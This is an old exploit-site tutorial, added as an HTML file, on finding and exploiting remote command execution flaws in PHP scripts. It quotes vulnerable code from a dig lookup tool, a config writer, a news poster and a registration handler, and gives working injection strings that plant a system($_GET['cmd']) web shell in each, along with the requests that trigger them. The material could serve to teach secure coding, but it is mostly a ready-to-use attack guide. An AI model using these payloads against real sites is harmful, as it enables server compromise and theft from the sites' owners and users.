@@ -1,0 +1,366 @@
+<html>
+<head>
+<title>How to find RCE in scripts (with examples)</title>
+<pre>
+---------------- How to find RCE in scripts (with examples) ----------------
+----------------              By SirGod                     ----------------
+----------------           www.insecurity-ro.org            ----------------
+----------------              www.h4cky0u.org               ----------------
+
+ - In this tutorial I will show you how to find Remote Command Execution vulnerabilities
+in PHP Web Applications (scripts).
+ - Through Remote Command Execution vulnerabilities you can execute commands on the 
+ webserver.
+ - I will present 4 examples + the basic one.
+ - I will start with a basic example.
+ 
+ File : index.php 
+ 
+Code snippet :
+ 
+&lt;?php
+$cmd=$_GET['cmd'];
+system($cmd);
+?&gt;
+
+ So if we do the following request 
+
+index.php?cmd=whoami
+
+ Our command will be executed.
+
+ In PHP is more functions that let you to execute commands :
+ 
+exec — Execute an external program
+passthru — Execute an external program and display raw output
+shell_exec — Execute command via shell and return the complete output as a string
+system — Execute an external program and display the output
+
+ If in script is used exec() you can't see the command output(but the command is executed)
+until the result isn't echo'ed from script.Example :
+
+&lt;?php
+$cmd=$_GET['cmd'];
+echo exec($cmd);
+?&gt;
+
+ But this is only an basic example of Remote Command Execution.You will neved find this
+in PHP scripts unless the coder is a monkey.
+
+
+1) - Lets start with an real-life example.All the following examples is real-life.All of
+them are discovered by me in different php scripts.
+
+ The 1st example is an whois lookup script,they execute command in terminal to do that.
+Works only on *NIX systems.
+ 
+ Lets take a look in dig.php file :
+
+Code snippet :
+
+&lt;?php
+
+    include(&quot;common.php&quot;);
+    showMenu();
+    echo '&lt;br&gt;';
+	$status = $_GET['status'];
+	$ns  = $_GET['ns'];
+	$host   = $_GET['host'];
+	$query_type   = $_GET['query_type']; // ANY, MX, A , etc.
+	$ip     = $_SERVER['REMOTE_ADDR'];
+	$self   = $_SERVER['PHP_SELF'];
+
+..................................................................................
+
+		  $host = trim($host);
+		  $host = strtolower($host);
+		  echo(&quot;&lt;span class=\&quot;plainBlue\&quot;&gt;&lt;b&gt;Executing : &lt;u&gt;dig @$ns $host $query_type&lt;/u&gt;&lt;/b&gt;&lt;br&gt;&quot;);
+		  echo '&lt;pre&gt;';
+		  //start digging in the namserver
+	      system (&quot;dig @$ns $host $query_type&quot;);
+		  echo '&lt;/pre&gt;';
+	} else {
+?&gt;
+ 
+ We are interested in these lines :
+
+ 	$ns  = $_GET['ns'];
+    system (&quot;dig @$ns $host $query_type&quot;);
+	
+ The &quot;ns&quot; variable is unfiltered and can be modified by user.An attacker can use any command
+that he want through this variable.We can execute commands like in the previous example.
+ If we request :
+  
+   dig.php?ns=whoam&amp;host=sirgod.net&amp;query_type=NS&amp;status=digging
+   
+ Will not work.Why?The code will be 
+ 
+     system (&quot;dig whoami sirgod.com NS&quot;);
+	 
+and that command dont exist and the execution will fail.What to do to work?In *NIX systems
+we have the AND operator who can be used in terminal.That operator is ||.So if we make a 
+request like this :
+
+  dig.php?ns=||whoami||&amp;host=sirgod.net&amp;query_type=NS&amp;status=digging
+  
+our command will be succesfully executed.Look at the code :
+
+     system (&quot;dig ||whoami|| sirgod.net NS&quot;);
+	 
+will execute the command separately than &quot;dig&quot; and the other.
+
+
+2) - Lets continue with another example,little bit complicated than first.
+
+ Some scripts let you to modify the configuration of website after install.Bad mistake
+because usually configuration files is .php .
+
+ So we have the script instaled.We look in the admin.php file
+ 
+Code snippet :
+
+  if(isset($action) &amp;&amp; $action == &quot;setconfig&quot;) {
+    $config_file = &quot;config.php&quot;;
+    $handle = fopen($config_file, 'w');
+    $StringData = &quot;&lt;?php\r
+	$&quot;.&quot;news_width = '&quot;.clean($_POST[news_width]).&quot;';\r
+	$&quot;.&quot;bgcolor = '&quot;.clean($_POST[bgcolor]).&quot;';\r
+	$&quot;.&quot;fgcolor = '&quot;.clean($_POST[fgcolor]).&quot;';\r
+	$&quot;.&quot;padding = '&quot;.clean($_POST[padding]).&quot;';\r
+	$&quot;.&quot;subject_margin = '&quot;.clean($_POST[subject_margin]).&quot;';\r
+	$&quot;.&quot;fontname = '&quot;.clean($_POST[fontname]).&quot;';\r
+	$&quot;.&quot;fontsize = '&quot;.clean($_POST[fontsize]).&quot;';\r\n?&gt;&quot;;
+    fwrite($handle, $StringData);
+  }
+  
+  We see here that the script save the settings in config.php file.
+  
+  Now let's see the config.php file content :
+  
+Code snippet :
+
+&lt;?php
+	$news_width = '600px';
+	$bgcolor = '#000000';
+	$fgcolor = '#ffffff';
+	$padding = '5px';
+	$subject_margin = '0px';
+	$fontname = 'verdana';
+	$fontsize = '13px';
+?&gt;
+
+ So we cand inject php code in news_width for example .Now,the things will be
+more complicated.We can inject our code but we must pay attention to the code.
+I will show you an example to understand what I say.
+
+ We will inject the following php code in news_width variable.The code will be
+written into config.php file.Let's go to admin.php?action=setconfig file and 
+inject the code.
+
+Code :
+
+&lt;?php system($_GET['cmd']); ?&gt;
+
+ The code will become :
+ 
+&lt;?php
+	$news_width = '&lt;?php system($_GET['cmd']); ?&gt;';
+	$bgcolor = '#000000';
+	$fgcolor = '#ffffff';
+	$padding = '5px';
+	$subject_margin = '0px';
+	$fontname = 'verdana';
+	$fontsize = '13px';
+?&gt;
+ 
+ And that is wrong.If we request the config.php file we will get an parse error:
+ 
+Parse error: parse error in C:\wamp\www\config.php on line 3
+
+ So we must inject something more complicated.
+ 
+';system($_GET['cmd']);'
+
+ Why this code?Look,the code inside config.php file will become :
+ 
+&lt;?php
+	$news_width = '';system($_GET['cmd']);'';
+	$bgcolor = '#000000';
+	$fgcolor = '#ffffff';
+	$padding = '5px';
+	$subject_margin = '0px';
+	$fontname = 'verdana';
+	$fontsize = '13px';
+?&gt;
+ 
+ Lets split it :
+
+  	$news_width = '';
+	system($_GET['cmd']);
+	'';
+	
+ No parse error,so we can succesfully execute our commands.Let's make the request :
+ 
+ config.php?cmd=whoami
+ 
+ No more || because we don't need,only our command is executed.
+ 
+ 
+3) - Lets go to the next example.In this script the news are saved in news.txt file.
+
+ Lets see the contents of news.txt file :
+ 
+&lt;table class='sn'&gt; &lt;tbody&gt; &lt;tr&gt;&lt;td class='sn-title'&gt; test &lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td class='sn-date'&gt; Posted on: 08/06/2009 &lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td class='sn-post'&gt; test &lt;/td&gt;&lt;/tr&gt; &lt;/tbody&gt;&lt;/table&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;
+ 
+ We can add what we want.We can inject our code and nothing will happen because is .txt file?Wrong.
+Lets search deeper the script.We go to post news by accessing post.php .
+
+ Lets take a look in post.php
+ 
+$newsfile = &quot;news.txt&quot;; 
+$file = fopen($newsfile, &quot;r&quot;); 
+..........................................................................
+ elseif ((isset($_REQUEST[&quot;title&quot;])) &amp;&amp; (isset($_REQUEST[&quot;date&quot;])) &amp;&amp;
+(isset($_REQUEST[&quot;post&quot;])) &amp;&amp; ($_REQUEST[&quot;title&quot;]!=&quot;&quot;) &amp;&amp;
+($_REQUEST[&quot;date&quot;]!=&quot;&quot;) &amp;&amp; ($_REQUEST[&quot;post&quot;]!=&quot;&quot;)) {
+$current_data = @fread($file, filesize($newsfile));
+fclose($file);
+$file = fopen($newsfile, &quot;w&quot;);
+$_REQUEST[&quot;post&quot;] = stripslashes(($_REQUEST[&quot;post&quot;]));
+$_REQUEST[&quot;date&quot;] = stripslashes(($_REQUEST[&quot;date&quot;]));
+$_REQUEST[&quot;title&quot;] = stripslashes(($_REQUEST[&quot;title&quot;]));
+if(fwrite($file,$btable . &quot; &quot; . $btitle . &quot; &quot; . $_REQUEST[&quot;title&quot;] . &quot; &quot; .  $etitle . &quot; &quot; . $bdate . &quot; &quot; . $_REQUEST[&quot;date&quot;] . &quot; &quot; . $edate . &quot; &quot; . $bpost . &quot; &quot; . $_REQUEST[&quot;post&quot;] . &quot; &quot; . $epost . &quot; &quot; . $etable . &quot;\n &quot; . $current_data))
+include 'inc/posted.html';
+else 
+include 'inc/error1.html'; 
+fclose($file);
+}
+ 
+ We can see here how the news are written in news.txt file.Input not filtered of course.
+ Now the news must be displayed to visitors.How the script do that?Lets take a look in
+display.php file. 
+
+Code snippet :
+
+&lt;?
+include(&quot;news.txt&quot;);
+?&gt;
+
+ Nice,the news.txt content is included in display.php file.What we do?We go to post.php
+and add some news.
+ We will inject our code in &quot;title&quot; variable.We write there the following code :
+ 
+ &lt;?php system($_GET['cmd']); ?&gt;
+ 
+ so the news.txt content will become :
+ 
+&lt;table class='sn'&gt; &lt;tbody&gt; &lt;tr&gt;&lt;td class='sn-title'&gt;  &lt;?php system($_GET['cmd']); ?&gt; &lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td class='sn-date'&gt; Posted on: 08/06/2009 &lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td class='sn-post'&gt; test2 &lt;/td&gt;&lt;/tr&gt; &lt;/tbody&gt;&lt;/table&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;
+ &lt;table class='sn'&gt; &lt;tbody&gt; &lt;tr&gt;&lt;td class='sn-title'&gt; test &lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td class='sn-date'&gt; Posted on: 08/06/2009 &lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td class='sn-post'&gt; test &lt;/td&gt;&lt;/tr&gt; &lt;/tbody&gt;&lt;/table&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;
+ 
+ And our evil code is there.Let's take a look in display.php .That file include the content of news.txt,
+so the code in display.php will look like :
+
+&lt;?
+&lt;table class='sn'&gt; &lt;tbody&gt; &lt;tr&gt;&lt;td class='sn-title'&gt;  &lt;?php system($_GET['cmd']); ?&gt; &lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td class='sn-date'&gt; Posted on: 08/06/2009 &lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td class='sn-post'&gt; test2 &lt;/td&gt;&lt;/tr&gt; &lt;/tbody&gt;&lt;/table&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;
+ &lt;table class='sn'&gt; &lt;tbody&gt; &lt;tr&gt;&lt;td class='sn-title'&gt; test &lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td class='sn-date'&gt; Posted on: 08/06/2009 &lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td class='sn-post'&gt; test &lt;/td&gt;&lt;/tr&gt; &lt;/tbody&gt;&lt;/table&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;
+?&gt;
+
+ No parse error or any other problem so we can go to :
+ 
+ display.php?cmd=whoami
+ 
+ and execute succesfully our commands.
+ 
+4) - Now a little bit complicated script than the previous scripts.
+
+ In this script,when we register,our details will be saved in php files.
+Lets take a loog in add_reg.php file :
+ 
+Code snippet :
+
+$user = $_POST['user'];
+$pass1 = $_POST['pass1'];
+$pass2 = $_POST['pass2'];
+$email1 = $_POST['email1'];
+$email2 = $_POST['email2'];
+$location = $_POST['location'];
+$url = $_POST['url'];
+$filename = &quot;./sites/&quot;.$user.&quot;.php&quot;;
+..............................................
+$html = &quot;&lt;?php
+\$regdate = \&quot;$date\&quot;;
+\$user = \&quot;$user\&quot;;
+\$pass = \&quot;$pass1\&quot;;
+\$email = \&quot;$email1\&quot;;
+\$location = \&quot;$location\&quot;;
+\$url = \&quot;$url\&quot;;
+?&gt;&quot;;
+$fp = fopen($filename, 'a+');
+fputs($fp, $html) or die(&quot;Could not open file!&quot;);
+
+
+ We can see that the script creates a php file in &quot;sites&quot; directory( ourusername.php ).
+ The script save all the user data in that file so we can inject our evil code into one
+field,I choose the &quot;location&quot; variable.
+
+ So if we register as an user with the location (set the &quot;location&quot; value) :
+ 
+&lt;?php system($_GET['cmd']); ?&gt;
+
+ the code inside ourusername.php will become : 
+ 
+
+&lt;?php
+	$regdate = &quot;13 June 2009, 4:16 PM&quot;;
+	$user = &quot;pwned&quot;;
+	$pass = &quot;pwned&quot;;
+	$email = &quot;pwned@yahoo.com&quot;;
+	$location = &quot;&lt;?php system($_GET['cmd']); ?&gt;&quot;;
+	$url = &quot;http://google.ro&quot;;
+?&gt;
+
+ So we will get an parse error.Not good.We must inject a more complicated code 
+to get the result that we want.
+ 
+ Lets add this code :
+ 
+ \&quot;;?&gt;&lt;?php system(\$_GET['cmd']);?&gt;&lt;?php \$xxx=\&quot;:D
+ 
+ So the code inside ourusername.php will become :
+
+&lt;?php
+	$regdate = &quot;13 June 2009, 4:16 PM&quot;;
+	$user = &quot;pwned&quot;;
+	$pass = &quot;pwned&quot;;
+	$email = &quot;pwned@yahoo.com&quot;;
+	$location = &quot;&quot;;?&gt;&lt;?php system($_GET['cmd']);?&gt;&lt;?php $xxx=&quot;:D&quot;;
+	$url = &quot;http://google.ro&quot;;
+?&gt; 
+ 
+ and we will have no error.Why?See the code :
+ 
+ 	$location = &quot;&quot;;?&gt;&lt;?php system($_GET['cmd']);?&gt;&lt;?php $xxx=&quot;:D&quot;;
+
+ Lets split it :
+ 
+ 	$location = &quot;&quot;;
+	?&gt;
+	&lt;?php system($_GET['cmd']);?&gt;
+	&lt;?php $xxx=&quot;:D&quot;;
+
+ We set the location value to &quot;&quot;,close the first php tags,open the tags
+again,wrote our evil code,close the tags and open other and add a variable
+&quot;xxx&quot; because we dont want any error.I wrote that code because I want no 
+error,can be modified to be small but will give some errors(will not 
+stop us to execute commands but looks ugly).
+
+ So we can go to :
+
+	sites/ourusername.php?cmd=whoami
+ 
+ and successfully execute our commands.
+	
+Shoutz to all members of www.insecurity-ro.org and www.h4cky0u.org
+
+# milw0rm.com [2009-08-07]</pre>
+</html>
